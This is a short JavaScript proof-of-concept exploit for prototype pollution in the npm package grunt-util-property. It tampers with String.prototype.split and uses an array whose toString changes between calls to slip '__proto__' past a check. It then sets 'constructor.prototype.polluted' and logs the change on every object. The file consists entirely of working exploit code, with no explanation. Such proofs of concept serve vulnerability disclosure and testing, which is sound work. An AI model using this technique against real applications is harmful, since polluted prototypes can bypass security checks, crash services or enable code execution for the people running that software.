var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const grunt = require('grunt');
const a = require('grunt-util-property');
console.log({}.polluted);
let b = a(grunt);
b.call({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);